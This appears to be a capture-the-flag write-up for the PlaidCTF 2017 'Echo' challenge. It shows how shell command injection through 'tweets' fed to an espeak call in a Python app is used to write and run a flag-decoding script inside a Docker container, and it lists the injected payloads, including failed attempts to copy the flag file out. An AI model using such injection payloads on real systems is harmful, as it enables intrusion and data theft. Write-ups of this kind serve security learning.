# PlaidCTF '17 Echo Challenge Writeup

This challenge was really fun. The organisers did a splendid job --
everything was there for a reason (to frustrate people) and it felt like
everything had been carefully planned and orchestrated to guide towards
a specific direction. Thanks for the hours of fun!

## TL;DR

 * The web app parsing each "tweet" and turning them into a spoken
   sentence is vulnerable to a trivial code injection
 * In particular, the app is a python script running in a Docker
   container 
 * The only available flag in the container is a large file made up by
   XOR'ing random characters with the actual flag in a reversible manner
 * My solution consited in writing a minified script to "decrypt" the
   flag file, execute it remotely and have the speech synthetiser "read
   back" the flag

I must admit, hearing the prize of your hack spoken aloud made me feel
like I was in a "hacking" Hollywood movie. What a bizarre experience.

## What worked

The first step was to fetch the Docker image used to run the speech
synthetiser and inspect the `run.py` script:

    docker run --rm -m=100M --cpu-period=100000 --cpu-quota=40000 --network=none -v $PWD:/share/ -it lumjjb/echo_container:latest /bin/bash

The code injection is trivial for the `l` parameter of `run.py`:

    call(["sh","-c", "espeak " + " -w " + OUTPUT_PATH + str(i) + ".wav \"" + l + "\""])

Running the main `echo_....py` server locally shows what happens when instead
of a regular tweet, you insert something like this:

    "; ls #

Great, we have code injection. ...Except that the `/share/flag` file is
too large to be read aloud; it is however created by this routine, which
is reversible:

    def process_flag (outfile):
        with open(outfile,'w') as f:
            for x in flag:
                c = 0
                towrite = ''
                for i in range(65000 - 1):
                    k = random.randint(0,127)
                    c = c ^ k
                    towrite += chr(k)
    
                f.write(towrite + chr(c ^ ord(x)))
        return

Which basically means:

 * Take the value `0`
 * XOR it with a random value
 * Write the result to the flag file
 * Rinse and repeat 64999 times
 * Now take the n-th character of the actual flag
 * XOR it with the output of the latest XOR action
 * Write the result to the flag file

So on and so forth.

The script to reverse the function above and print it to standard output is this:

    p=65000
    # the location of the flag will change in the minified version, this is for debugging
    with open('flag') as f:
        ff = f.read()
    flaglen = len(ff)/p
    # print "Flag length: {}".format(flaglen)
    for i in range(flaglen):
        c = 0
        for j in range(i*p, (i+1)*p-1):
            k = ord(ff[j])
            c = c ^ k
        z = ord(ff[j+1]) ^ c
        # the output will also change
        print z,chr(z),".",

The idea is to *execute this script* in the Docker container and use the
synthetiser to read the output back. The problem is that this script is
too long and the container has no networking; so I can't copy it over,
but I can write it to a file and have it executed.

The minified version of the script is this:

    p=65000
    f=open("/share/flag").read()
    for i in range(38):
     c=0
     for j in range(i*p,(i+1)*p-1):
      c=c^ord(f[j])
     z=ord(f[j+1])^c
     print z,

I'm using one space instead of four (no jokes about tabs please),
changed all variable names and hard-coded the length of the flag.

How did I know the length of the flag? I've asked the container. This
"tweet" when read aloud returns "Thirty Eight" spoken aloud by a male
voice:

    $(echo $(($(wc -c /share/flag | cut -d' ' -f 1)/65000)))

To write the minified script to a file in the container I've used the following two
"tweets":

    ";/bin/bash -c "echo -ne 'p=65000\nf=open(\"/share/flag\").read()\nfor i in range(38):\n c=0\n for j in range(i*' >o" #

    ";/bin/bash -c "echo -ne 'p,(i+1)*p-1):\n  c=c^ord(f[j])\n z=ord(f[j+1])^c\n print z,chr(z),\n' >>o" #

The lines above write the "minified" script to a file called `o`. Things
to note:

 1. I'll spare you the amount of cursing I had to go through to escape
    those quotes
 1. The container runs `/bin/sh`; to write newlines I wanted to use
    `echo` which is a BASH built-in, so I'm executing `/bin/bash -c`.
    I'm sure there's a better way, but hey I felt so close to finishing
    this at that point that I could not care too much for the subleties
    and POSIX correctness
 1. Initially I was printing only the ASCII value of the flag, but I
    thought I'd also print the ASCII character as a check:

        prints `z,chr(z),`

 1. Also, since the synthetiser doesn't read capitalisation or
    punctuation, the ASCII value had a purpose there

Lastly, as a third tweet I invoked the Python executable to execute the
`o` script. The `-g` option is to slow it down. There is no `;` at the
beginning because I wanted the output of my reversing script to be read
aloud by the `espeak` synthetiser:

    $(python o) " -g 70 #

The resulting WAV file contained those values (I transcribed it by hand):

    a = [80, 67, 84, 70, 123, 76, 49, 53, 115, 116, 51, 110, 95, 84, 48, 95, 95, 114, 101, 101, 101, 95, 114, 101, 101, 101, 101, 101, 101, 95, 114, 101, 101, 101, 95, 108, 97, 125]

Which turned into characters gave the flag:

    b = [ chr(i) for i in a]
    ''.join(b)

    'PCTF{L15st3n_T0__reee_reeeeee_reee_la}'

## What did not work

What I hate about reading writeups is that they are told in a linear
fashion. There's no blood and sweat and invoking Chtulhu; the writer
normally goes "I did A, then B, then C and found the solution easy peasy
eh" and that's it.

So here's a random collection of things I tried and that failed
miserably, and what I learned in the process.

### Failed attempts

First I tried moving the flag file into the `output` area of the Docker
shared volume to retrieve it manually. Something like:

    ";mkdir -p /share/audio;cp /share/flag /share/audio/out #

Nope.

Maybe it's too big? After all there's some limitation about file
size...

    ";mkdir -p /share/audio;tar cjf /share/audio/out /share/flag #

Nope.

Then I realised the call to `ffmpeg` was meant to move only audio
files to the final stage for retrieval. The use of `audio` in the
`route` confused me for a long time. 

Ok so I had to do something with the flag file. I thought the
"encryption" was too hard and that I wasn't smart enough to figure it
out, so I thought what if I try to append the flag file to the WAV?
Something like:

    ";cat /share/out/1.wav <(tar czf - /share/flag) > /share/out/1.wav #

I opened the WAV specification looking for ways to append metadata.
Turns out, you can't but you can use RIFF segments to append basically
anything. There's people that use WAV files as descriptors of digital
circuits... go figure. However the idea of hacking WAV files wasn't
going down well so I gave it a try at reversing the encrption.. after
that it was a matter of chasing the 'read back' option. And that's
how I finally, eventually got to the solution.


### Reversing the 'encryption'

My OCD dictates that I must understand every single bit of text or code
I stumble upon. This makes me a very slow code reviewer and massive PITA
when it comes to document review. It also meant I needed to understand
the "encryption" very well to reverse it. 

This is the simplified code I used as a unit test against my
'decryption' program above:

    import random
    
    flag = "ABCDE"
    def enc():
        with open('outflag', 'w') as f:
            for x in flag:
                c = 0
                towrite = ''
                for i in range(10-1):
                    k = random.randint(0, 127)
                    c = c ^ k
                    print i, c
                    towrite += chr(k)
                f.write(towrite+chr(c^ord(x)))
    enc()

Once the decryption was working flawlessly it became easy to minify it.
I tried a few random flags as well and all worked, so I was confident I
could give it a try. That's when the quoting pain started...


### Generating the final payload, and all that quoting

Auxiliary script to generate the two payloads, with more or less the
correct length:

    with open('d.py') as f:
        src = f.read()
        with open('out.txt', 'w') as g:
            g.write(repr(src))
    print "Full payload: ", src.encode('string_escape')
    cutoff = 80
    t1 = "\";/bin/bash -c \"echo -ne '" +src[:cutoff].encode('string_escape') + "'>o\" #"
    t2 = "\";/bin/bash -c \"echo -ne '{}'>>o\" #".format(src[cutoff:].encode('string_escape'))
    t3 = '$(python o) " -g 70 #'
    print len(t1), t1
    print len(t2), t2
    print len(t3), t3

Things I've learned:

 * The `.encode('string_escape')` trick, otherwise Python quotes quotes
   (as in `'` becomes `''`)
 * Quoting madness: the above script doesn't return the correct result:
   it still needs manually escaping the `"` into `\"` to be inserted in
   the `echo` executed by `bash`.


